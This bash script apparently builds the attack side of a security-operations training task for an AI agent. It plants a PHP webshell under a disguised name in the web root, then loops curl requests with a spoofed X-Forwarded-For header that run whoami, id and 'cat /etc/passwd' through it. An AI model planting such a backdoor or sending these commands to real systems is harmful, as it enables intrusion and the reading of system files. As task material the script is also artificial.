#!/bin/bash
# Hard: Active Webshell C2
# Plants a PHP backdoor in the web root, then continuously sends shell commands
# to it via HTTP — generating distinctive access log entries.
# The agent must BOTH kill this process (kill_process) AND delete the file (delete_file).

if [ -f /tmp/micro_soc_state.env ]; then
    source /tmp/micro_soc_state.env
    BACKDOOR_FILE=$HARD_BACKDOOR_NAME
    ATTACKER_IP=$HARD_ATTACKER_IP
else
    BACKDOOR_NAMES=("backdoor.php" "shell.php" "cmd.php" "wp-config.php.bak" "admin_helper.php")
    BACKDOOR_FILE=${BACKDOOR_NAMES[$((RANDOM % ${#BACKDOOR_NAMES[@]}))]}
    ATTACKER_IP="$((RANDOM % 255 + 1)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"
fi

BACKDOOR="/var/www/html/$BACKDOOR_FILE"

echo "hard_attack: planting backdoor at $BACKDOOR"
cat > "$BACKDOOR" << 'EOF'
<?php if(isset($_GET['cmd'])){ @system(base64_decode($_GET['cmd'])); } ?>
EOF

echo "hard_attack: backdoor planted ($BACKDOOR_FILE), starting C2 loop from $ATTACKER_IP"
while true; do
    # Send encoded shell commands to the webshell
    curl -s -H "X-Forwarded-For: $ATTACKER_IP" \
        -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 [$$]" \
        "http://localhost/$BACKDOOR_FILE?cmd=$(echo -n 'whoami' | base64)" > /dev/null
    sleep 1
    curl -s -H "X-Forwarded-For: $ATTACKER_IP" \
        -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 [$$]" \
        "http://localhost/$BACKDOOR_FILE?cmd=$(echo -n 'id' | base64)" > /dev/null
    sleep 1
    curl -s -H "X-Forwarded-For: $ATTACKER_IP" \
        -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 [$$]" \
        "http://localhost/$BACKDOOR_FILE?cmd=$(echo -n 'cat /etc/passwd' | base64)" > /dev/null
    sleep 2
done
